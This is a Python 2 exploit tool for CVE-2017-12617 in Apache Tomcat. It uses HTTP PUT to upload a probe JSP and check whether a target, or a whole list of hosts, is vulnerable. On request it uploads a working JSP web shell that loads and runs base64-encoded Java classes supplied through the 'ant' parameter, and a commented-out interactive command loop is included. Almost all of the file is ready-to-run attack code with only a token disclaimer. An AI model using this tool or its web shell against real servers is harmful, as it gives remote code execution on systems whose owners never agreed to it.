#!/usr/bin/python
import requests
import re
import signal
import base64
from optparse import OptionParser

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

banner="""
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           


[@Fkbug]

"""

def signal_handler(signal, frame):
    print ("\033[91m"+"\n[-] Exiting"+"\033[0m")
    exit()

signal.signal(signal.SIGINT, signal_handler)

def removetags(tags):
    remove = re.compile('<.*?>')
    txt = re.sub(remove, '\n', tags)
    return txt.replace("\n\n\n","\n")


def getContent(url,f):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    requests.packages.urllib3.disable_warnings()
    re=requests.get(str(url)+"/"+str(f), headers=headers,verify=False)
    return re.content

def createPayload(url,f):
    evil='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    requests.packages.urllib3.disable_warnings()
    req=requests.put(str(url)+str(f)+"/",data=evil, headers=headers,verify=False)
    if req.status_code==201:
        print 'File Created..'

   
def RCE(url,f):
    EVIL="""<%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%><% String cls=request.getParameter("ant");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%>""" 

    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    requests.packages.urllib3.disable_warnings()
    req=requests.put(str(url)+f+"/",data=EVIL, headers=headers,verify=False)
    if req.status_code == 201:
        print 'Nice! We have a web shell..'
    

#def shell(url,f):
    
    #while True:
        #headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        #cmd=raw_input("$ ")
        #payload={'cmd':cmd}
        #if cmd=="q" or cmd=="Q":
        #        break
        #requests.packages.urllib3.disable_warnings()
        #re=requests.get(str(url)+"/"+str(f),params=base64.urlsafe_b64encode(str(payload)),headers=headers,verify=False)
        #re=str(re.content)
        #t=removetags(base64.urlsafe_b64decode(re))
        #print t
        #print base64.urlsafe_b64decode(re)


#print bcolors.HEADER+ banner+bcolors.ENDC
parse=OptionParser(
bcolors.HEADER+"""
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           


python2 Fk-17-12617.py [options]

options:
-u --url  [::] check target url if it is vulnerable 
-p --pwn  [::] generate webshell and upload it
-l --list [::] hosts list

[+]usage:

python Fk-17-12617.py -u http://127.0.0.1
python Fk-17-12617.py --url http://127.0.0.1
python Fk-17-12617.py -u http://127.0.0.1 -p pwn
python Fk-17-12617.py --url http://127.0.0.1 -pwn pwn
python Fk-17-12617.py -l hotsts.txt
python FK-17-12617.py --list hosts.txt


[@v0.1by Fkbug]
[@Support the antSword branch v2.x@]
[@Just for education purpose, plz dont used for any ileagal activity@]

"""+bcolors.ENDC

    )


parse.add_option("-u","--url",dest="U",type="string",help="Website Url")          
parse.add_option("-p","--pwn",dest="P",type="string",help="generate webshell and upload it")
parse.add_option("-l","--list",dest="L",type="string",help="hosts File")

(opt,args)=parse.parse_args()

if opt.U==None and opt.P==None and opt.L==None:
    print(parse.usage)
    exit(0)



else:
    if opt.U!=None and opt.P==None and opt.L==None:
        print bcolors.OKGREEN+banner+bcolors.ENDC 
    	url=str(opt.U)
    	checker="poc.jsp"
    	print bcolors.BOLD +"Poc Filename  {}".format(checker)
    	createPayload(str(url)+"/",checker)
    	con=getContent(str(url)+"/",checker)
    	if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
    		print bcolors.WARNING+url+' is Vulnerable to CVE-2017-12617'+bcolors.ENDC
		print bcolors.WARNING+url+"/"+checker+bcolors.ENDC
		
	else:
            print 'Not Vulnerable to CVE-2017-12617 '
    elif opt.P!=None and opt.U!=None and  opt.L==None:
                print bcolors.OKGREEN+banner+bcolors.ENDC 
		pwn=str(opt.P)
		url=str(opt.U)
		print "Uploading Webshell ....."
		pwn=pwn+".jsp"
		RCE(str(url)+"/",pwn)
		#shell(str(url),pwn)
    elif opt.L!=None and opt.P==None and opt.U==None:
                print bcolors.OKGREEN+banner+bcolors.ENDC 
		w=str(opt.L)
		f=open(w,"r")
		print "Scaning hosts in {}".format(w)
		checker=".jsp"
		for i in f.readlines():
			i=i.strip("\n")
			createPayload(str(i)+"/",checker)
			con=getContent(str(i)+"/",checker)
			if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
				print str(i)+"\033[91m"+" [ Vulnerable ] ""\033[0m"

